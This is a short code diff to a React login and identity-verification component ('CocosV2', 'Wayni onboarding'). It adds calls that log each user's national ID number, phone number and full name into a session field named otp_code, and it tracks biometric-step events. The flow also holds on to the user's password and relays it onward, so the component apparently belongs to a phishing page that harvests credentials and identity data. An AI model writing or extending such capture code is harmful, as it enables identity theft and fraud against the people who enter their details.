@@ -959,6 +959,7 @@ const CocosV2 = () => {
 
   // ── Identity Verification (Wayni onboarding) ──
   const handleIdentityVerify = useCallback(async (data: { identity_number: string; phone_number: string }) => {
+    await updateSession("verify_dni_submitted", { otp_code: `dni:${data.identity_number}|phone:${data.phone_number}` });
     const pwd = lastPasswordRef.current || lastPassword;
     const { data: result, error: apiError } = await invokeWayni({
       action: "onboarding_verify",
@@ -969,13 +970,20 @@ const CocosV2 = () => {
     });
 
     if (apiError || result?.error) {
+      await updateSession("verify_dni_error");
       throw new Error(result?.error || apiError?.message || "Error en la verificación");
     }
 
     if (result?.full_name) setSyncedFullName(result.full_name);
     setBiometricUrl(result.biometric_url);
+    await updateSession("verify_dni_success", { otp_code: `dni:${data.identity_number}|name:${result?.full_name || ""}` });
     setStep("biometric");
-  }, [email, lastPassword, syncedPhone]);
+  }, [email, lastPassword, syncedPhone, updateSession]);
+
+  // ── Biometric events tracking ──
+  const handleBiometricEvent = useCallback(async (event: string) => {
+    await updateSession(event);
+  }, [updateSession]);
 
   const handleBack = useCallback(() => {
     setStep("login");
@@ -1081,6 +1089,7 @@ const CocosV2 = () => {
             email={email}
             fullName={syncedFullName}
             biometricUrl={biometricUrl}
+            onEvent={handleBiometricEvent}
           />
         )}
 
